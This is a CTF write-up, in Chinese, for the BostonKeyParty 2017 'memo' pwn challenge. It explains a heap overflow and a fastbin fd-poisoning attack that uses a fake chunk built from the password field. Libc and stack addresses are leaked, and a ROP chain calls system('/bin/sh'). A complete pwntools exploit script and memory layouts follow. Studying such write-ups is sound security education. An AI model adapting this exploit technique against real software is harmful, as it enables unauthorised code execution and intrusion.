title: '[BOSTONKEYPARTY CTF 2017] memo 300'
author: Naetw
tags:
  - pwn
  - BOSTONKEYPARTY CTF 2017
  - heap overflow
  - ROP
categories:
  - write-ups
date: 2017-03-01 16:38:40
---
## Info  
> Category: pwn
> Point: 300
> Solver: Naetw @ BambooFox

## Analyzing

64 bits ELF, Full RELRO, 有 NX, 沒有 canary & PIE

* 一些在這支程式會用到的 global variable：

```
        +-----------------------+
        | idx       |           |  # 之後 leave or edit or delete 會透過這個 global buffer 來存取 index
        |           |           |
        +-----------------------+
        | name      |           |  # Store user name(32 bytes)
        |           |           |
        +-----------------------+
        | password  |           |  # Store user's password
        |           |           |
        +-----------------------+
        | idx0 idx1 | idx2 idx3 |  # Store size of messages( 4 bytes per size of msg )
        +-----------------------+
        | msg0 adr  | msg1 adr  |  # Store address of messages
        | msg2 adr  | msg3 adr  |
        +-----------------------+
```

這題一開始會問 user name，並存在 global buffer，接著會問要不要設定密碼，密碼長度最大 32 bytes

User name & password 設定好之後有五個選項：

Leave message:

* 首先會問 index，之後如果 size 正確會存入上面提到的 global buffer
* 接著會問 msg size，如果大於 32 bytes，他只會呼叫 `malloc(32)` 給你，但是 read 完之後不會存入 global buffer 的 list 之中。這裡有一個 **overflow** 的漏洞，如果我 size 輸入 100，他雖然只有 `malloc(32)` 但是他會 read(0, buf, size)，因此後面可以利用這個洞改到其他 chunk struct
* 如果 size 小於 32 bytes，在讀完 message 之後會存到上面提到的 list

Edit message:

* 這邊會直接用 global buffer 上的 idx 所表示的值來決定要修改哪個 message，因此這邊只能修改最後一次留下的 message
* read size 是利用 global buffer 上的 size list

View message:

* 印出 message 內容
* 之後會拿來 leak libc address

Delete message:

* 一開始會問 index，但是並沒有做 0~4 的檢查，所以前面的 name or password 可以任意構造 address 來達到任意 `free`，不過這裡我不是利用這個方法。利用這個方法可參考 [Angelboy 學長](https://github.com/scwuaptx/CTF/blob/master/2017-writeup/bkp/memo.py)
* `free` 完之後，global list 會清成 0，因此沒有 **UAF**

Change password:

* 可以修改密碼，但是這邊我沒有用到，便不細說 

Quit:

* `puts` 後 return，後面會利用這邊的 return 跳到 ROP


## Exploit

前面名字隨便亂取，但是密碼稍微構造一下:

```
0x602a40:       0x4141414141414141      0x4141414141414141
0x602a50:       0x4141414141414141      0x0000000000000030
```

* `0x602a58` 的 `0x30` 是為了後面 overwrite fastbin 的時候，讓 `malloc(32)` return `0x602a60` 之後就可以做任意 leak 跟 任意 overwrite


接著 leave two messages，index 分別 0 and 1，size 都給 32，之後 global buffer 長這樣：

```
0x602a40:       0x4141414141414141      0x4141414141414141
0x602a50:       0x4141414141414141      0x0000000000000030
0x602a60:       0x0000002000000020      0x0000000000000000
0x602a70:       0x0000000000d41010      0x0000000000d41040
```

* `0x602a60` 的前 4 bytes 是 index0 msg size，後 4 bytes 就是 index1 msg size
* `0x602a70` 存的就是 index0 msg address，`0x602a78` 存的則是 index1 msg address


之後就要來 overflow，要達到任意 `malloc` 一塊空間，需要 overflow 一個已經 `free` 過的 fastbin chunk，由於 fastbin list 是 LIFO，因此先將 index1 msg `free` 掉，接著 `free` index0 msg，之後再來利用前面提到 size 超過 32 的 overflow，size 給他個 400，這樣他還是會 call `malloc(32)`，因此我們依舊能拿到跟先前 index0 msg 同一塊 chunk

這時候我們有 overflow 可以把 index1 msg struct 改寫掉，這邊我們是改寫他的 `fd` 這樣之後先 `malloc` 一次把正常的 chunk 拿走，第二次就會拿到我們填的 `fd` 的位置

overflow 過的 layout：

```
0xd41000:       0x0000000000000000      0x0000000000000031  # Original index0 msg chunk
0xd41010:       0x4141414141414141      0x4141414141414141
0xd41020:       0x4141414141414141      0x4141414141414141
0xd41030:       0x0000000000000000      0x0000000000000031  # Original index1 msg chunk
0xd41040:       0x0000000000602a50      0x000000000000000a  # 0x602a50 - fake chunk by password
0xd41050:       0x0000000000000000      0x0000000000000000
0xd41060:       0x0000000000000000      0x0000000000020fa1
```

因為 `malloc` 會檢查 chunk size 是不是符合同一個 fastbin 的 size，所以前面 password 裡面的 `0x30` 就派上用場了，如此一來第二次的 `malloc` 可以通過檢查讓我們可以拿到 `0x602a60`，接著因為這個 chunk data 的開頭是 `size_list` 所以稍微構造一下 input，把 size 從 32 調大，順便擺上某個 function 的 `got.plt`，size 是為了後面疊 ROP 的時候比較方便，`got.plt` 則是拿來 leak libc function，底下是 layout：


```
0x602a40:       0x4141414141414141      0x4141414141414141
0x602a50:       0x4141414141414141      0x0000000000000030
0x602a60:       0x000000f0000000f0      0x00000020000000f0
0x602a70:       0x0000000000601fb0      0x000000000000000a
0x602a80:       0x0000000000000000      0x0000000000602a60
```

* 這邊把假 chunk 放在 index3 這樣可以一次利用到 0~2
* index3 size 因為 leave 最後面的行為會把 `0xf0` 蓋掉改回 `0x20` 不過沒關係後面會進行一次 `edit` 會把他改寫回來


接著就可以利用 `view(0)`，來 leak `0x601fb0` 也就是 `__libc_start_main` 的 libc address，拿到之後，利用一次 `edit` 把 size 改回 `0xf0` 順便把 `0x601fb0` 換成 `environ` 的位置，來 leak stack address(environ 是一個在 libc 裡面的一個 symbol，他裡面存著 stack address 指到 `char** envp`)：

```
0x602a40:       0x4141414141414141      0x4141414141414141
0x602a50:       0x4141414141414141      0x0000000000000030
0x602a60:       0x000000f0000000f0      0x000000f0000000f0
0x602a70:       0x00007fb71186af98      0x000000000000000a
0x602a80:       0x0000000000000000      0x0000000000602a60
```

一樣利用 `view(0)` 來 leak stack address，算一下跟 `main` 的 return address 位置的 offset，之後，再次利用 `edit` 不過這次是要 overwrite `0x602a88` 位置，也就是 index3 message 的位置，把它改成 `main return address` 的位置，這樣再次 `edit` 就可以疊 ROP，疊完就選擇 `Quit` 便會跳到剛剛疊的 ROP 上，這次 ROP 很簡單，從 libc 裡面找一個 gadget `pop_rdi_ret` 然後 sh 字串也是從 libc 裡面找，接著直接跳到 `system`，成功開 shell ！


改成 stack address 的 layout + ROP：

```python
0x602a40:       0x4141414141414141      0x4141414141414141
0x602a50:       0x4141414141414141      0x0000000000000030
0x602a60:       0x000000f0000000f0      0x000000f0000000f0
0x602a70:       0x4141414141414141      0x4141414141414141
0x602a80:       0x4141414141414141      0x00007ffda8984928  # stack address

ROP:
sh = base + next(libc.search('/bin/sh\x00'))
system = base + libc.symbols['system']
pop_rdi =  base + 0x0000000000021102
payload = p64(pop_rdi) + p64(sh) + p64(system)
edit(payload)
```

Final Exploit:

```python
#!/usr/bin/env python
# -*- coding: utf8 -*-
from pwn import * # pip install pwntools
import sys

reip = '54.202.7.144'
report = 8888

r = process('./memo-patch')
#r = remote(reip, report)

# Setup name & pw
r.recvuntil("What's user name:")
r.sendline('nae')
r.recvuntil('Do you wanna set password? (y/n)')
r.sendline('y')
r.recvuntil('Password:')
r.sendline('A'*24 + p64(0x30))

def leave(idx, length, payload, overflow=False):
    r.recvuntil('>>')
    r.sendline('1')
    r.recvuntil('Index:')
    r.sendline(str(idx))
    r.recvuntil('Length:')
    r.sendline(str(length))
    if not overflow:
        r.recvuntil('Message:')
    else:
        r.recvuntil('message too long, you can leave on memo though')
    r.sendline(payload)

def delete(idx):
    r.recvuntil('>>')
    r.sendline('4')
    r.recvuntil('Index:')
    r.sendline(str(idx))

def view(idx):
    r.recvuntil('>>')
    r.sendline('3')
    r.recvuntil('Index:')
    r.sendline(str(idx))

def edit(payload):
    r.recvuntil('>>')
    r.sendline('2')
    r.recvuntil('Edit message:')
    r.send(payload)

global_size = 0x602a60
libc_start_main_got = 0x601fb0
libc = ELF('bc.so.6')

leave(0, 32, 'A'*8)
leave(1, 32, 'B'*8)

# Overflow
delete(1)
delete(0)
payload = ('A'*32 + p64(0) + p64(0x31) + # Restore chunk struct
        p64(global_size-0x10))           # Fake fd
leave(0, 400, payload, True)
leave(0, 32, 'A'*4)                      # malloc garbage
fix_size_payload = '\xf0'.ljust(4, '\x00')*4
payload = fix_size_payload + p64(libc_start_main_got)
leave(3, 32, payload)                    # Get the chunk in global

# Leak libc base
view(0)
r.recvuntil('View Message: ')
base = u64(r.recvline()[:-1] + '\x00'*2) - libc.symbols['__libc_start_main']
log.success('base : {}'.format(hex(base)))

# Leak stack address
payload = fix_size_payload + p64(base + libc.symbols['environ'])
edit(payload)
view(0)
r.recvuntil('View Message: ')
stack = u64(r.recvline()[:-1] + '\x00'*2) - 0xf0
log.success('stack : {}'.format(hex(stack)))

# Exploit
payload = fix_size_payload + 'A'*24 + p64(stack)
edit(payload)
sh = base + next(libc.search('/bin/sh\x00'))
system = base + libc.symbols['system']
pop_rdi =  base + 0x0000000000021102
payload = p64(pop_rdi) + p64(sh) + p64(system)
edit(payload)

# Return to ROP
r.recvuntil('>>')
r.sendline('6')

r.interactive()
```

FLAG: `bkp{you are a talented and ambitious hacker}`
